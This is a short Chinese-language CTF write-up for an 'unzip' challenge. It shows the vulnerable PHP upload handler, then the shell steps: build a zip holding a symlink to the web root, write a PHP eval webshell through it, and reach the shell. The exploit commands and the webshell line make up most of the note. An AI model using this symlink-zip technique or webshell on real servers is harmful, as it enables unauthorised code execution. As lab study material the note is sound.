tags:: [[CTF/Zip]]

- # unzip
	- 上传zip，看到`upload.php`源码
		- ```php
		  <?php
		  error_reporting(0);
		  highlight_file(__FILE__);
		  
		  $finfo = finfo_open(FILEINFO_MIME_TYPE);
		  if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
		      exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
		  };
		  ```
	- 我们可以使用zip创建软链接并向软链接中写入文件
	- 首先考虑将`/var/www/html`文件夹软链接到`/tmp`文件夹中
		- ```shell
		  # cube @ fedora in /tmp .venv [10:33:12] 
		  $ ln -s /var/www/html/ html          
		  (.venv) 
		  # cube @ fedora in /tmp .venv [10:33:23] C:130
		  $ zip --symlinks archive.zip html
		  ```
		- 上传archive.php即可
	- 然后将`html/test.php`写入archive.zip
		- ```shell
		  # cube @ fedora in /tmp .venv [10:36:43] C:1
		  $ echo '<?php eval($_POST["data"]);?>' | sudo tee html/test.php
		  [sudo] cube 的密码：
		  <?php eval($_POST["data"]);?>
		  (.venv) 
		  # cube @ fedora in /tmp .venv [10:36:49] 
		  $ zip archive.zip html/test.php
		  updating: html/test.php (stored 0%)
		  ```
	- 最后访问`test.php`即可得到webshell